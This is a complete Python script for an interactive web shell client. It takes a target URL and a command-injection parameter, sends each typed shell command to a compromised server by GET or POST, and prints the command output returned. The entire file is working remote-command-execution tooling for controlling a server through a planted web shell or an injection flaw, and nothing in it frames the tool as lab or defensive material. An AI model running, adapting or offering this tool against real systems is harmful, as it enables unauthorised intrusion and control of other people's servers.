#!/usr/bin/env python3

#********************************
#**Interactive Web Shell Client** 
#********************************

import argparse 
import requests 
import readline 
import sys 
import re 
from urllib.parse import urlparse

session = requests.Session() 
url = '' 
param_name = '' 
method = 'POST'

def validate_url(url: str) -> bool:
	parsed = urlparse(url)
	return parsed.scheme in ('http', 'https') and parsed.netloc != ''
	
def sanitise_command(command: str) -> str:
	command = command.strip()
	if not command:
		return ''
	if re.search(r'[\u0000-\u001F\u007F]', command):
		print("Warning: Command contains forbidden characters.")
		return ''
	return command
	
def send_command(command:str) -> str:
	global session, url, param_name, method
	if not command:
		return ''

	try: 
		if method == 'GET': 
			print("Warning: using GET will put commands into the URL (server logs / proxies may store them).") 
			params = {param_name: command}
			response = session.get(url, params=params, timeout=10)
		elif method == 'POST':
			data = {param_name: command}
			response = session.post(url, data=data, timeout=10)
		else: 
			print(f"Unsupported HTTP method: {method}")
			return '' 
		response.raise_for_status()
		return parse_response(response.text)
	except requests.RequestException as e:
		print(f"HTTP {method} error: {e}")
		return ''
		
def parse_response(response_text: str) -> str:
	clean_text = re.sub('<[^<]+?>', '', response_text) 
	return clean_text.strip()
	
def interactive_shell():
	print("Interactive Web Shell Client - Type 'exit' or Ctrl+D to quit.")
	while True:
		try:
			command = input("webshell> ")
			if command.lower() in ('exit', 'quit'):
				print("Exiting...")
				break

			sanitised = sanitise_command(command)
			if not sanitised:
				continue

			output = send_command(sanitised)
			if output:
				print(output)
		except EOFError:
			print("\nEOF detected. Exiting...")
			break
		except KeyboardInterrupt:
			print("\nUse 'exit' or Ctrl+D to exit.")
			continue

def parse_args() -> argparse.Namespace:
	parser = argparse.ArgumentParser(description='Interactive Web Shell Client')
	parser.add_argument('url', help='Web Shell URL')
	parser.add_argument('param', help='Parameter name for command injection')
	parser.add_argument('-X', '--method', choices=['GET', 'POST'], default='POST', help='HTTP method (default: POST)')
	return parser.parse_args()
	
def main():
	global url, param_name, method

	args = parse_args()
	args.url = args.url.strip()

	if not validate_url(args.url):
		print("Invalid URL. Please provide a full http(s):// URL.")
		sys.exit(2)      
    
	url = args.url
	param_name = args.param
	method = args.method.upper()
    
	interactive_shell()

if __name__ == '__main__':
	main()
	
